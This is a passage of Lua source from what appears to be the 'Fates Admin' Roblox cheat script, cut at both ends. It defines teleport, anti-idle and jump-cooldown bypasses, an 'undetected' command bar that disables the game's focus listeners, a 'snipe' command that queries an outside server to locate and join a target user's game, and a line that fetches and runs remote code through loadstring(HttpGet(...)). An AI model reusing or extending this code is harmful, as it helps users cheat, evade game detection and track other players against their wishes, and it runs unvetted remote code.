	AddCommand("unplastic", {"unfpsboost"}, "changes everything back from a plastic material", {}, function(Caller, Args, CEnv)
		local Plastics = LoadCommand("plastic").CmdEnv
		local time = tick();
		local Amount = 0
		for i, v in next, Plastics do
			i.Material = v
			Amount = Amount + 1
		end
		return format("removed %d plastic in %.3f (s)", Amount, (tick()) - time);
	end)

	AddCommand("antiafk", {"antiidle"}, "prevents kicks from when you're afk", {}, function(Caller, Args, CEnv)
		local IsEnabled = CEnv[1]
		for i, v in next, getconnections(LocalPlayer.Idled) do
			if (IsEnabled) then
				v.Enable(v);
				CEnv[1] = nil
			else
				v.Disable(v);
				CEnv[1] = true
			end
		end
		return "antiafk " .. (IsEnabled and " disabled" or "enabled");
	end)

	AddCommand("clicktp", {}, "tps you to where your mouse is when you click", {}, function(Caller, Args, CEnv)
		local HasTool_ = CEnv[1] ~= nil
		if (HasTool_) then
			Destroy(CEnv[1]);
			Destroy(CEnv[2]);
		end
		local Tool = InstanceNew("Tool");
		Tool.RequiresHandle = false
		Tool.Name = "Click TP"
		ProtectInstance(Tool);
		Tool.Parent = GetCharacter();
		AddConnection(CConnect(Tool.Activated, function()
			local Hit = Mouse.Hit
			GetRoot().CFrame = Hit * CFrame.new(0, 3, 0);
		end))

		local Tool2 = InstanceNew("Tool");
		Tool2.RequiresHandle = false
		Tool2.Name = "Click TweenTP"
		ProtectInstance(Tool2);
		Tool2.Parent = LocalPlayer.Backpack
		AddConnection(CConnect(Tool2.Activated, function()
			local Hit = Mouse.Hit
			Utils.Tween(GetRoot(), "Sine", "Out", .5, {CFrame = Hit * CFrame.new(0, 3, 0)});
		end))

		CEnv[1] = Tool
		CEnv[2] = Tool2
		return "click to teleport"
	end)

	AddCommand("help", {"info"}, "gives you the description of the command", {"1"}, function(Caller, Args)
		local Command = Args[1]
		local Loaded = LoadCommand(Command);
		if (Loaded) then
			Utils.Notify(Caller, Loaded.Name, Loaded.Description, 8);
		end
	end)

	AddCommand("friend", {"fr"}, "sends a friend request to the player", {"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local RequestFriendship = LocalPlayer.RequestFriendship
		for i, v in next, Target do
			RequestFriendship(LocalPlayer, v);
		end
		return #Target == 1 and "sent a friend request to " .. Target[1].Name or format("sent a friend request to %d players", #Target);
	end)

	AddCommand("unfriend", {"unfr"}, "unfriends a player that you're friends with", {"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local RevokeFriendship = LocalPlayer.RevokeFriendship
		for i, v in next, Target do
			RevokeFriendship(LocalPlayer, v);
		end
		return #Target == 1 and "unfriended " .. Target[1].Name or format("unfriended %d players", #Target);
	end)

	AddCommand("setzoomdistance", {"szd", "maxzoom"}, "sets your cameras zoom distance so you can zoom out", {}, function(Caller, Args)
		local ZoomDistance = tonumber(Args[1]) or 1000
		LocalPlayer.CameraMaxZoomDistance = ZoomDistance
		LocalPlayer.CameraMode = Enum.CameraMode.Classic
		return "set zoom distance to " .. ZoomDistance
	end)

	AddCommand("equiptools", {}, "equips all of your tools", {1}, function()
		UnequipTools(GetHumanoid());
		local Char = GetCharacter();
		local Tools = filter(GetChildren(LocalPlayer.Backpack), function(i, Child)
			return IsA(Child, "Tool");
		end);
		for i, v in next, Tools do
			v.Parent = Char
		end
		return format("equipped %d tools", #Tools);
	end)

	AddCommand("activatetools", {}, "equips and activates all of your tools", {1}, function()
		local VirtualInputManager = Services.VirtualInputManager
		local SendMouseButtonEvent = VirtualInputManager.SendMouseButtonEvent
		UnequipTools(GetHumanoid());
		local Char = GetCharacter();
		local Tools = filter(GetChildren(LocalPlayer.Backpack), function(i, Child)
			return IsA(Child, "Tool");
		end);
		for i, v in next, Tools do
			v.Parent = Char
		end
		wait();
		for i, v in next, Tools do
			v.Activate(v);
		end
		SendMouseButtonEvent(VirtualInputManager, 0, 0, 0, true, nil, #Tools);
		-- return format("equipped and activated %d tools", #Tools);
	end)

	AddCommand("hidename", {"hidetag"}, "hides your nametag (billboardgui)", {3}, function(Caller, Args, CEnv)
		local Char = GetCharacter();
		local Billboard = FindFirstChildWhichIsA(Char, "BillboardGui", true);
		if (not Billboard) then
			return "you don't have a player tag to use this command"
		end
		for i, v in next, GetDescendants(Char) do
			if (IsA(v, "BillboardGui")) then
				CEnv[v] = v.Parent
				Destroy(v);
			end
		end
		return "name hidden, use showname to show it again"
	end)

	AddCommand("showname", {"showtag"}, "shows your player tag", {3}, function()
		local Char = GetCharacter();
		local Billboards = LoadCommand("hidename").CmdEnv
		if (not next(Billboards)) then
			return "your name is already shown"
		end
		return "you have to reset to show your nametag"
	end)

	AddCommand("nojumpcooldown", {}, "removes a jumpcooldown if any in games", {}, function()
		local UserInputService = Services.UserInputService
		local Humanoid = GetHumanoid();
		local connections = tbl_concat(getconnections(UserInputService.JumpRequest), getconnections(GetPropertyChangedSignal(Humanoid, "FloorMaterial")), getconnections(Humanoid.Jumping));
		for i, v in next, connections do
			if (v.Func and not is_synapse_function(v.Func)) then
				if (Hooks.NoJumpCooldown) then
					v.Enable(v);
				else
					v.Disable(v);
				end
			end
		end
		Hooks.NoJumpCooldown = not Hooks.NoJumpCooldown
		return "nojumpcooldown " .. (Hooks.NoJumpCooldown and "Enabled" or "Disabled")
	end)

	local LoadConfig, ConfigLoaded;
	AddCommand("config", {"conf"}, "shows fates admin config", {}, function(Caller, Args, CEnv)
		if (not ConfigLoaded) then
			if (not CEnv[1]) then
				LoadConfig();
			end
			Utils.SetAllTrans(ConfigUI);
			ConfigUI.Visible = true
			Utils.TweenAllTransToObject(ConfigUI, .25, ConfigUIClone);
			ConfigLoaded = true
			CEnv[1] = true
			return "config loaded"
		end
	end)

	AddCommand("deletetool", {"deltool"}, "deletes your equipped tool", {1}, function()
		local Tool = FindFirstChildWhichIsA(GetCharacter(), "Tool");
		if (Tool) then
			Destroy(Tool);
			return "deleted tool"
		else
			return "no tool equipped"
		end
	end)

	AddCommand("deletetools", {"deltools"}, "delets all of your tools in your inventory", {1}, function()
		UnequipTools(GetHumanoid());
		local Tools = GetChildren(LocalPlayer.Backpack);
		for i = 1, #Tools do
			Destroy(Tools[i]);
		end
		return "deleted all tools"
	end)

	AddCommand("rejoinre", {"rje"}, "rejoins and tps you to your old position", {3}, function()
		local Pos = GetRoot().CFrame
		local queue_on_teleport = syn and syn.queue_on_teleport or queue_on_teleport
		if (queue_on_teleport) then
			queue_on_teleport(format("game.Loaded:Wait();game:GetService('ReplicatedFirst'):SetDefaultLoadingGuiRemoved();local LocalPlayer = game:GetService('Players').LocalPlayer;LocalPlayer.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = CFrame.new(%s);loadstring(game.HttpGet(game, \"https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua\"))()", tostring(Pos)));
		end
		ExecuteCommand("rejoin", {}, LocalPlayer);
	end)

	AddCommand("toggle", {"togglecommand", "togglecmd"}, "toggles a command with an 'un' command", {"1"}, function(Caller, Args, CEnv)
		local Command = Args[1]
		if (LoadCommand(Command)) then
			CEnv.Command = (CEnv.Command and CEnv.Command ~= true) and true or not CEnv.Command
			local NewArgs = shift(Args);
			if (CEnv.Command) then
				ExecuteCommand(Command, NewArgs, Caller);
			else
				ExecuteCommand("un" .. Command, NewArgs, Caller);
			end
		else
			return Command .. " is not a valid command"
		end
	end)

	AddCommand("inviscam", {"inviscamera"}, "makes you see through walls more better", {}, function(Caller, Args, CEnv)
		CEnv.OldCameraMaxZoomDistance = LocalPlayer.CameraMaxZoomDistance
		CEnv.OldDevCameraOcclusionMode = LocalPlayer.DevCameraOcclusionMode
		LocalPlayer.CameraMaxZoomDistance = 600
		LocalPlayer.DevCameraOcclusionMode = "Invisicam"
		return "inviscam enabled"
	end)

	AddCommand("uninviscam", {"uninviscamera"}, "disables inviscam", {}, function()
		local CmdEnv = LoadCommand("inviscam").CmdEnv
		LocalPlayer.CameraMaxZoomDistance = CmdEnv.OldCameraMaxZoomDistance
		LocalPlayer.DevCameraOcclusionMode = CmdEnv.OldDevCameraOcclusionMode
		return "inviscam disabled"
	end)

	AddCommand("snipe", {"streamsnipe"}, "stream snipes a user", {"2"}, function(Caller, Args)
		local PlaceId = tonumber(Args[1]);
		local UserId = tonumber(Args[2]);
		if (not PlaceId) then
			return "placeid expected"
		end
		if (not UserId) then
			return "userid expected"
		end
		local Ret = game.HttpGet(game, format("https://fate123.000webhostapp.com/sniper.php?uid=%s&placeId=%s", UserId, PlaceId));
		local Success, JSON = pcall(JSONDecode, Services.HttpService, Ret);
		if (not Success) then
			return "error occured"
		end
		if (JSON.error) then
			return "error: " .. JSON.error
		end
		local GameInfo = JSON.game
		local UserInfo = JSON.userinfo
		local TeleportService = Services.TeleportService
		TeleportService.TeleportToPlaceInstance(TeleportService, GameInfo.gameid, GameInfo.guid);
		return format("joining %s on game %s (%d/%d)", UserInfo.username, GameInfo.gamename, GameInfo.playing, GameInfo.capacity);
	end)

	AddCommand("loop", {"loopcommand"}, "loops a command", {"1"}, function(Caller, Args, CEnv)
		local Command = Args[1]
		local LoadedCommand = LoadCommand(Command);
		if (not LoadedCommand) then
			return format("command %s not found", Command);
		end
		Args = shift(Args);
		CEnv.Looping = true
		CEnv.LoopedCommands = CEnv.LoopedCommands or {}
		CEnv.LoopedCommands[Command] = true
		CThread(function()
			while (CEnv.Looping and CEnv.LoopedCommands[Command]) do
				ExecuteCommand(Command, Args, Caller);
				wait(tonumber(Args[#Args]) or 1);
			end
		end)();
		return format("now looping the %s command", Command);
	end)

	AddCommand("unloop", {"unloopcommand"}, "unloops a command", {}, function(Caller, Args)
		local Looped = LoadCommand("loop").CmdEnv
		if (Args[1]) then
			if (Looped.LoopedCommands[Args[1]]) then
				Looped.LoopedCommands[Args[1]] = nil
				return format("unlooped command %s", Args[1]);
			end
			return "command isn't looped"
		else
			Looped.Looping = false
			return "unlooped all commands looped"
		end
	end)

	AddCommand("disablesit", {"neversit", "nosit"}, "disables you from being sat", {}, function(Caller, Args, CEnv)
		local Humanoid = GetHumanoid();
		AddConnection(CConnect(GetPropertyChangedSignal(Humanoid, "Sit"), function()
			CWait(Heartbeat);
			Humanoid.Sit = false
		end), CEnv);
		AddConnection(CConnect(LocalPlayer.CharacterAdded, function(Char)
			Humanoid = WaitForChild(Char, "Humanoid");
			AddConnection(CConnect(GetPropertyChangedSignal(Humanoid, "Sit"), function()
				CWait(RunService.Heartbeat);
				Humanoid.Sit = false
			end), CEnv);
		end), CEnv)
		return "disabled sit"
	end)

	AddCommand("enablesit", {"undisablesit"}, "enables disablesit", {}, function()
		DisableAllCmdConnections("disablesit");
		return "enabled sit"
	end)

	AddCommand("massplay", {}, "massplays all of your boomboxes", {3,1,"1"}, function(Caller, Args)
		local Audio = tonumber(Args[1]);
		if (not Audio and not match(Audio, "rbxassetid://%d+")) then
			return "number expected for audio"
		end
		Audio = Audio or Args[1]
		local Character = GetCharacter();
		local Humanoid = GetHumanoid();
		UnequipTools(Humanoid);
		local Boomboxes = filter(GetChildren(LocalPlayer.Backpack), function(i, v)
			if (Sfind(lower(v.Name), "boombox") or FindFirstChildOfClass(v.Handle, "Sound", true)) then
				v.Parent = Character
				return true
			end
			return false
		end)
		for i = 1, #Boomboxes do
			local Boombox = Boomboxes[i]
			local RemoteEvent = FindFirstChildWhichIsA(Boombox, "RemoteEvent")
			RemoteEvent.FireServer(RemoteEvent, "PlaySong", Audio);
		end
		delay(2, function()
			ExecuteCommand("sync", {}, Caller);
		end)
		return "now massplaying"
	end)

	AddCommand("sync", {"syncaudios"}, "syncs audios playing", {3}, function()
		local Humanoid = GetHumanoid();
		local Playing = filter(GetChildren(GetCharacter()), function(i,v)
			return IsA(v, "Tool") and FindFirstChildOfClass(v.Handle, "Sound");
		end)
		Playing = map(Playing, function(i, v)
			return FindFirstChildOfClass(v.Handle, "Sound");
		end)
		local Sound = Playing[1]
		Services.SoundService.RespectFilteringEnabled = false
		for i = 1, #Playing do
			Playing[i].TimePosition = Sound.TimePosition
		end
		Services.SoundService.RespectFilteringEnabled = true
		return format("synced %d sounds", #Playing);
	end)

	AddCommand("pathfind", {"follow2"}, "finds a user with pathfinding", {"1",3}, function(Caller, Args)
		local PathfindingService = Services.PathfindingService
		local CreatePath = PathfindingService.CreatePath
		local Target = GetPlayer(Args[1]);
		local LRoot = GetRoot();
		local LHumanoid = GetHumanoid();
		local PSSuccess = Enum.PathStatus.Success
		local Delay = tonumber(Args[2]);
		for i, v in next, Target do
			local TRoot = GetRoot(v);
			if (not TRoot) then
				continue;
			end
			local Path = CreatePath(PathfindingService);
			Path.ComputeAsync(Path, LRoot.Position, TRoot.Position);
			if (LHumanoid.Sit) then
				ChangeState(LHumanoid, 3);
			end
			LHumanoid.WalkSpeed = 16
			LHumanoid.MoveTo(LHumanoid, TRoot.Position);
			wait(2);
			local WayPoints = Path.GetWaypoints(Path);
			for i = 1, #WayPoints do
				local WayPoint = WayPoints[i]
				if (Path.Status == PSSuccess) then
					LHumanoid.WalkToPoint = WayPoint.Position
					if (WayPoint.Action == Enum.PathWaypointAction.Jump) then
						LHumanoid.WalkSpeed = 0
						wait();
						LHumanoid.WalkSpeed = 16
						ChangeState(LHumanoid, 3);
					end
					CWait(LHumanoid.MoveToFinished);
				else
					repeat Path.ComputeAsync(Path, LRoot.Position, TRoot.Position) until Path.Status == PSSuccess;
				end
			end
			if (Delay) then
				wait(Delay);
			end
		end
	end)

	--AddCommand("dex", {"darkdex"}, "A quick way to execute dark dex from the synapse script hub.", {}, loadstring(game:HttpGet("https://cdn.synapse.to/synapsedistro/hub/DarkDex.lua")));

	AddCommand("console", {"errors", "warns", "outputs"}, "shows the outputs fates admin has made", {}, function()
		local MessageClone = Clone(Console.Frame.List);

		Utils.ClearAllObjects(Console.Frame.List)
		Console.Visible = true

		local Tween = Utils.TweenAllTransToObject(Console, .25, ConsoleTransparencyClone)

		Destroy(Console.Frame.List)
		MessageClone.Parent = Console.Frame

		for i, v in next, GetChildren(Console.Frame.List) do
			if (not IsA(v, "UIListLayout")) then
				Utils.Tween(v, "Sine", "Out", .25, {
					TextTransparency = 0
				})
			end
		end

		local ConsoleListLayout = Console.Frame.List.UIListLayout

		CConnect(GetPropertyChangedSignal(ConsoleListLayout, "AbsoluteContentSize"), function()
			local CanvasPosition = Console.Frame.List.CanvasPosition
			local CanvasSize = Console.Frame.List.CanvasSize
			local AbsoluteSize = Console.Frame.List.AbsoluteSize

			if (CanvasSize.Y.Offset - AbsoluteSize.Y - CanvasPosition.Y < 20) then
				wait();
				Console.Frame.List.CanvasPosition = Vector2.new(0, CanvasSize.Y.Offset + 1000);
			end
		end)

		Utils.Tween(Console.Frame.List, "Sine", "Out", .25, {
			ScrollBarImageTransparency = 0
		})
	end)

	local PlrChat = function(i, plr)
		if (not Connections.Players[plr.Name]) then
			Connections.Players[plr.Name] = {}
			Connections.Players[plr.Name].Connections = {}
		end
		Connections.Players[plr.Name].ChatCon = CConnect(plr.Chatted, function(raw)
			if (plr == LocalPlayer) then
				local Processed = Keys.GameProcessed
				local Last = Keys.LastEntered
				if (not Processed or Last ~= Enum.KeyCode.Return) then
					local K;
					local T = CThread(function()
						K = CWait(Services.UserInputService.InputBegan);
					end)();
					wait();
					if (K.KeyCode ~= Enum.KeyCode.Return) then
						return    
					end
					T = nil
				end
			end
			local message = raw

			if (_L.ChatLogsEnabled) then

				local time = os.date("%X");
				local Text = format("%s - [%s]: %s", time, plr.Name, raw);
				local Clone = Clone(ChatLogMessage);

				Clone.Text = Text
				Clone.Visible = true
				Clone.TextTransparency = 1
				Clone.Parent = ChatLogs.Frame.List

				Utils.Tween(Clone, "Sine", "Out", .25, {
					TextTransparency = 0
				})

				ChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, ChatLogs.Frame.List.UIListLayout.AbsoluteContentSize.Y);
			end

			if (startsWith(raw, "/e")) then
				raw = sub(raw, 4);
			elseif (startsWith(raw, "/w")) then
				raw = shift(shift(split(message, " ")));
			elseif (startsWith(raw, Prefix)) then
				raw = sub(raw, #Prefix + 1);
			else
				return
			end

			message = trim(raw);

			if (Tfind(AdminUsers, plr) or plr == LocalPlayer) then
				local CommandArgs = split(message, " ");
				local Command = CommandArgs[1]
				local Args = shift(CommandArgs);

				ExecuteCommand(Command, Args, plr);
			end
		end)
	end

	--IMPORT [uimore]
	Notification.Visible = false
	Utils.SetAllTrans(CommandBar);
	Utils.SetAllTrans(ChatLogs);
	Utils.SetAllTrans(GlobalChatLogs);
	Utils.SetAllTrans(HttpLogs);
	Utils.SetAllTrans(Console);
	Commands.Visible = false
	ChatLogs.Visible = false
	Console.Visible = false
	GlobalChatLogs.Visible = false
	HttpLogs.Visible = false

	Utils.Draggable(Commands);
	Utils.Draggable(ChatLogs);
	Utils.Draggable(Console);
	Utils.Draggable(GlobalChatLogs);
	Utils.Draggable(HttpLogs);
	Utils.Draggable(ConfigUI);

	ParentGui(UI);
	Connections.UI = {}

	local Times = #LastCommand
	AddConnection(CConnect(Services.UserInputService.InputBegan, function(Input, GameProccesed)
		if (Input.KeyCode == CommandBarPrefix and (not GameProccesed)) then
			CommandBarOpen = not CommandBarOpen

			local TransparencyTween = CommandBarOpen and Utils.TweenAllTransToObject or Utils.TweenAllTrans
			local Tween = TransparencyTween(CommandBar, .5, CommandBarTransparencyClone);
			local UserInputService = Services.UserInputService

			if (CommandBarOpen) then
				if (not Draggable) then
					Utils.Tween(CommandBar, "Quint", "Out", .5, {
						Position = UDim2.new(0.5, WideBar and -200 or -100, 1, -110)
					})
				end

				local TextConnections;
				if (UndetectedCmdBar) then
					TextConnections = getconnections(UserInputService.TextBoxFocused);
					for i, v in next, TextConnections do
						v.Disable(v);
					end
					for i, v in next, getconnections(UserInputService.TextBoxFocusReleased, true) do
						v.Disable(v);
					end
				end

				CommandBar.Input.CaptureFocus(CommandBar.Input);
				CThread(function()
					wait()
					CommandBar.Input.Text = ""
					local FocusedTextBox = UserInputService.GetFocusedTextBox(UserInputService);
					local TextBox = CommandBar.Input
					while (FocusedTextBox ~= TextBox) do
						FocusedTextBox.ReleaseFocus(FocusedTextBox);
						CommandBar.Input.CaptureFocus(TextBox);
						FocusedTextBox = UserInputService.GetFocusedTextBox(UserInputService);
						CWait(Heartbeat);
					end
				end)()

				if (UndetectedCmdBar) then
					for i, v in next, TextConnections do
						v.Enable(v);
					end
				end
			else
				if (not Draggable) then
					Utils.Tween(CommandBar, "Quint", "Out", .5, {
						Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5)
					})
				end
			end
		elseif (not GameProccesed and ChooseNewPrefix) then
			CommandBarPrefix = Input.KeyCode
			Utils.Notify(LocalPlayer, "New Prefix", "Your new prefix is: " .. split(tostring(Input.KeyCode), ".")[3]);
			ChooseNewPrefix = false
			if (writefile) then
				Utils.Notify(LocalPlayer, nil, "use command saveprefix to save your prefix");
			end
		elseif (GameProccesed and CommandBarOpen) then
			if (Input.KeyCode == Enum.KeyCode.Up) then
				Times = Times >= 3 and Times or Times + 1
				CommandBar.Input.Text = LastCommand[Times][1] .. " "
				CommandBar.Input.CursorPosition = #CommandBar.Input.Text + 2
			end
			if (Input.KeyCode == Enum.KeyCode.Down) then
				Times = Times <= 1 and 1 or Times - 1
				CommandBar.Input.Text = LastCommand[Times][1] .. " "
				CommandBar.Input.CursorPosition = #CommandBar.Input.Text + 2
			end
		end
	end), Connections.UI, true);

	Utils.Click(Commands.Close, "TextColor3")
	Utils.Click(ChatLogs.Clear, "BackgroundColor3")
	Utils.Click(ChatLogs.Save, "BackgroundColor3")
	Utils.Click(ChatLogs.Toggle, "BackgroundColor3")
	Utils.Click(ChatLogs.Close, "TextColor3")

	Utils.Click(Console.Clear, "BackgroundColor3");
	Utils.Click(Console.Save, "BackgroundColor3");
	Utils.Click(Console.Close, "TextColor3");

	Utils.Click(GlobalChatLogs.Clear, "BackgroundColor3")
	Utils.Click(GlobalChatLogs.Save, "BackgroundColor3")
	Utils.Click(GlobalChatLogs.Toggle, "BackgroundColor3")
	Utils.Click(GlobalChatLogs.Close, "TextColor3")

	Utils.Click(HttpLogs.Clear, "BackgroundColor3")
	Utils.Click(HttpLogs.Save, "BackgroundColor3")
	Utils.Click(HttpLogs.Toggle, "BackgroundColor3")
	Utils.Click(HttpLogs.Close, "TextColor3")

	AddConnection(CConnect(Commands.Close.MouseButton1Click, function()
		local Tween = Utils.TweenAllTrans(Commands, .25)

		CWait(Tween.Completed);
		Commands.Visible = false
	end), Connections.UI, true);

	AddConnection(CConnect(GetPropertyChangedSignal(Commands.Search, "Text"), function()
		local Text = Commands.Search.Text
		local Children = GetChildren(Commands.Frame.List);
		for i = 1, #Children do
			local v = Children[i]
			if (IsA(v, "Frame")) then
				local Command = v.CommandText.Text
				v.Visible = Sfind(lower(Command), Text, 1, true)
			end
		end
		Commands.Frame.List.CanvasSize = UDim2.fromOffset(0, Commands.Frame.List.UIListLayout.AbsoluteContentSize.Y)
	end), Connections.UI, true);

	AddConnection(CConnect(ChatLogs.Close.MouseButton1Click, function()
		local Tween = Utils.TweenAllTrans(ChatLogs, .25)

		CWait(Tween.Completed);
		ChatLogs.Visible = false
	end), Connections.UI, true);
	AddConnection(CConnect(GlobalChatLogs.Close.MouseButton1Click, function()
		local Tween = Utils.TweenAllTrans(GlobalChatLogs, .25)

		CWait(Tween.Completed);
		GlobalChatLogs.Visible = false
	end), Connections.UI, true);
	AddConnection(CConnect(HttpLogs.Close.MouseButton1Click, function()
		local Tween = Utils.TweenAllTrans(HttpLogs, .25)

		CWait(Tween.Completed);
		HttpLogs.Visible = false
	end), Connections.UI, true);

	AddConnection(CConnect(Console.Close.MouseButton1Click, function()
		local Tween = Utils.TweenAllTrans(Console, .25)

		CWait(Tween.Completed);
		Console.Visible = false
	end), Connections.UI, true);

	ChatLogs.Toggle.Text = _L.ChatLogsEnabled and "Enabled" or "Disabled"
	GlobalChatLogs.Toggle.Text = _L.ChatLogsEnabled and "Enabled" or "Disabled"
	HttpLogs.Toggle.Text = _L.HttpLogsEnabled and "Enabled" or "Disabled"

	AddConnection(CConnect(ChatLogs.Toggle.MouseButton1Click, function()
		_L.ChatLogsEnabled = not _L.ChatLogsEnabled
		ChatLogs.Toggle.Text = _L.ChatLogsEnabled and "Enabled" or "Disabled"
	end), Connections.UI, true);
	AddConnection(CConnect(GlobalChatLogs.Toggle.MouseButton1Click, function()
		_L.GlobalChatLogsEnabled = not _L.GlobalChatLogsEnabled
		GlobalChatLogs.Toggle.Text = _L.GlobalChatLogsEnabled and "Enabled" or "Disabled"
	end), Connections.UI, true);
	AddConnection(CConnect(HttpLogs.Toggle.MouseButton1Click, function()
		_L.HttpLogsEnabled = not _L.HttpLogsEnabled
		HttpLogs.Toggle.Text = _L.HttpLogsEnabled and "Enabled" or "Disabled"
	end), Connections.UI, true);

	AddConnection(CConnect(ChatLogs.Clear.MouseButton1Click, function()
		Utils.ClearAllObjects(ChatLogs.Frame.List)
		ChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, 0)
	end), Connections.UI, true);
	AddConnection(CConnect(GlobalChatLogs.Clear.MouseButton1Click, function()
		Utils.ClearAllObjects(GlobalChatLogs.Frame.List)
		GlobalChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, 0)
	end), Connections.UI, true);
	AddConnection(CConnect(HttpLogs.Clear.MouseButton1Click, function()
		Utils.ClearAllObjects(HttpLogs.Frame.List)
		HttpLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, 0)
	end), Connections.UI, true);

	AddConnection(CConnect(Console.Clear.MouseButton1Click, function()
		Utils.ClearAllObjects(Console.Frame.List);
		Console.Frame.List.CanvasSize = UDim2.fromOffset(0, 0);
	end), Connections.UI, true);

	do
		local ShowWarns, ShowErrors, ShowOutput = true, true, true
		AddConnection(CConnect(Console.Warns.MouseButton1Click, function()
			ShowWarns = not ShowWarns
			local Children = GetChildren(Console.Frame.List);
			for i = 1, #Children do
				local v = Children[i]
				if (not IsA(v, "UIListLayout") and sub(v.Name, 1, 1) == "W") then
					v.Visible = ShowWarns
				end
			end
			Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
			Console.Warns.Text = ShowWarns and "Hide Warns" or "Show Warns"
		end), Connections.UI, true);
		AddConnection(CConnect(Console.Errors.MouseButton1Click, function()
			ShowErrors = not ShowErrors
			local Children = GetChildren(Console.Frame.List);
			for i = 1, #Children do
				local v = Children[i]
				if (not IsA(v, "UIListLayout") and sub(v.Name, 1, 1) == "E") then
					v.Visible = ShowErrors
				end
			end
			Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
			Console.Errors.Text = ShowErrors and "Hide Errors" or "Show Errors"
		end), Connections.UI, true);
		AddConnection(CConnect(Console.Output.MouseButton1Click, function()
			ShowOutput = not ShowOutput
			local Children = GetChildren(Console.Frame.List);
			for i = 1, #Children do
				local v = Children[i]
				if (not IsA(v, "UIListLayout") and sub(v.Name, 1, 1) == "P") then
					v.Visible = ShowOutput
				end
			end
			Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
			Console.Output.Text = ShowOutput and "Hide Output" or "Show Output"
		end), Connections.UI, true);
	end

	AddConnection(CConnect(GetPropertyChangedSignal(ChatLogs.Search, "Text"), function()
		local Text = ChatLogs.Search.Text
		local Children = GetChildren(ChatLogs.Frame.List);
		for i = 1, #Children do
			local v = Children[i]
			if (not IsA(v, "UIListLayout")) then
				local Message = v.Text
				v.Visible = Sfind(lower(Message), Text, 1, true);
			end
		end
		ChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, ChatLogs.Frame.List.UIListLayout.AbsoluteContentSize.Y);
	end), Connections.UI, true);

	AddConnection(CConnect(GetPropertyChangedSignal(GlobalChatLogs.Search, "Text"), function()
		local Text = GlobalChatLogs.Search.Text

		local Children = GetChildren(GlobalChatLogs.Frame.List);
		for i = 1, #Children do
			local v = Children[i]
			if (not IsA(v, "UIListLayout")) then
				local Message = v.Text

				v.Visible = Sfind(lower(Message), Text, 1, true)
			end
		end
	end), Connections.UI, true);

	AddConnection(CConnect(GetPropertyChangedSignal(HttpLogs.Search, "Text"), function()
		local Text = HttpLogs.Search.Text

		local Children = GetChildren(HttpLogs.Frame.List);
		for i = 1, #Children do
			local v = Children[i]
			if (not IsA(v, "UIListLayout")) then
				local Message = v.Text
				v.Visible = Sfind(lower(Message), Text, 1, true)
			end
		end
	end), Connections.UI, true);

	AddConnection(CConnect(GetPropertyChangedSignal(Console.Search, "Text"), function()
		local Text = Console.Search.Text
		local Children = GetChildren(Console.Frame.List);
		for i = 1, #Children do
			local v = Children[i]
			if (not IsA(v, "UIListLayout")) then
				local Message = v.Text
				v.Visible = Sfind(lower(Message), Text, 1, true)
			end
		end
		Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y)
	end), Connections.UI, true);


	AddConnection(CConnect(ChatLogs.Save.MouseButton1Click, function()
		local GameName = Services.MarketplaceService.GetProductInfo(Services.MarketplaceService, game.PlaceId).Name
		local String =  format("Fates Admin Chatlogs for %s (%s)\n\n", GameName, os.date());
		local TimeSaved = gsub(tostring(os.date("%x")), "/", "-") .. " " .. gsub(tostring(os.date("%X")), ":", "-");
		local Name = format("fates-admin/chatlogs/%s (%s).txt", GameName, TimeSaved);
		local Children = GetChildren(ChatLogs.Frame.List);
		for i = 1, #Children do
			local v = Children[i]
			if (not IsA(v, "UIListLayout")) then
				String = format("%s%s\n", String, v.Text);
			end
		end
		writefile(Name, String);
		Utils.Notify(LocalPlayer, "Saved", "Chat logs saved!");
	end), Connections.UI, true);

	AddConnection(CConnect(HttpLogs.Save.MouseButton1Click, function()
		local Children = GetChildren(HttpLogs.Frame.List);
		local Logs =  format("Fates Admin HttpLogs for %s\n\n", os.date());
		for i = 1, #Children do
			local v = Children[i]
			if (not IsA(v, "UIListLayout")) then
				Logs = format("%s%s\n", Logs, v.Text);
			end
		end
		if (not isfolder("fates-admin/httplogs")) then
			makefolder("fates-admin/httplogs");
		end
		writefile(format("fates-admin/httplogs/HttpLogs for %s", gsub(tostring(os.date("%X")), ":", "-")) .. ".txt", gsub(Logs, "%b<>", ""));
		Utils.Notify(LocalPlayer, "Saved", "Http logs saved!");
	end), Connections.UI, true);

	AddConnection(CConnect(Console.Save.MouseButton1Click, function()
		local GameName = Services.MarketplaceService.GetProductInfo(Services.MarketplaceService, game.PlaceId).Name
		local TimeSaved = gsub(tostring(os.date("%x")), "/", "-") .. " " .. gsub(tostring(os.date("%X")), ":", "-");
		local Children = GetChildren(Console.Frame.List);
		local String =  format("Fates Admin logs %s\nGame: %s - %d\n\n", TimeSaved, GameName, game.PlaceId);
		local Names = { ["P"] = "OUTPUT", ["W"] = "WARNING", ["E"] = "ERROR" }
		for i = 1, #Children do
			local v = Children[i]
			if (not IsA(v, "UIListLayout")) then
				String = format("%s[%s] %s\n", String, Names[sub(v.Name, 1, 1)] or "", v.Text);
			end
		end
		writefile("fates-admin/logs.txt", String);
		Utils.Notify(LocalPlayer, "Saved", "Console Logs saved!");
	end), Connections.UI, true);

	-- auto correct
	AddConnection(CConnect(GetPropertyChangedSignal(CommandBar.Input, "Text"), function() -- make it so that every space a players name will appear
		CommandBar.Input.Text = CommandBar.Input.Text
		local Text = CommandBar.Input.Text
		local Prediction = CommandBar.Input.Predict
		local PredictionText = Prediction.Text

		local Args = split(Text, " ")

		Prediction.Text = ""
		if (Text == "") then
			return
		end

		local FoundCommand = false
		local FoundAlias = false
		CommandArgs = CommandArgs or {}
		if (not CommandsTable[Args[1]]) then
